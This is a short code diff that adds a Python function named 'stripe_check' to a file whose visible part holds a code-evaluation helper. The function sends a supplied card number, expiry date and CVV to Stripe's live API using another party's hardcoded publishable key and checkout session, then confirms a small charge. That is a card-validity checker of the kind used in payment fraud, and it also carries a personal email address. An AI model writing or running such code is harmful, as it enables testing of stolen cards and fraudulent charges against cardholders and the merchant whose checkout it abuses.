@@ -74,3 +74,9 @@ def go_eval(code):
     else:
         result["errors"] = ""
     return result
+
+def stripe_check(cc_num, exp_mo, exp_year, cvv):
+    url = "https://api.stripe.com/v1/payment_methods?type=card&card[number]={}&card[cvc]={}&card[exp_month]={}&card[exp_year]={}&billing_details[name]=qaa&billing_details[email]=amarnathcharichilil%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=10800&guid=ce5b0c34-b48f-44d4-a209-ee6f5b7ac1cf0ca195&muid=aec6dc80-792a-414b-84f8-77d506cfe99ebba8a2&sid=72db390b-035f-4038-a2cb-322e52220087141c48&key=pk_live_90yYxj8Ba8Lo2pzYSgH0FDOF&payment_user_agent=stripe.js%2Fe99643aff%3B+stripe-js-v3%2Fe99643aff%3B+checkout".format(cc_num, cvv, exp_mo, exp_year)
+    with post(url) as p:
+         payment = "https://api.stripe.com/v1/payment_pages/cs_live_b1xQfzEHKCQUBveaBHegBeikCWg1PEa9dTJT6ZDupqd7G4MHDbOW0FA8kR/confirm?eid=NA&payment_method={}&expected_amount=1300&expected_payment_method_type=card&key=pk_live_90yYxj8Ba8Lo2pzYSgH0FDOF".format(p.json()["id"])
+         return post(payment).json()
